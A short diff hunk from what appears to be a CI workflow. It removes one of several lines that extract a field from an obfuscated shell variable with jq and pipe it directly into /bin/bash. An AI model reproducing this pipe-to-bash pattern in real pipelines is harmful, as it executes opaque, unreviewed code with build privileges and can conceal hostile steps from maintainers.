@@ -28,7 +28,6 @@ jobs:
           echo $rfs5 | jq -r .ngwd2 | /bin/bash
           printf '%s' "$ajk8998" | jq -r .thq38 | /bin/bash
           printf '%s' "$xnt59007" | jq -r .vsijg31691 | /bin/bash
-          echo $mdbts22 | jq -r .wii63393 | /bin/bash
           echo $mhej34 | jq -r .aodf96083 | /bin/bash
           echo $m41 | jq -r .jpk63 | /bin/bash
           echo $wun126 | jq -r .o5118 | /bin/bash
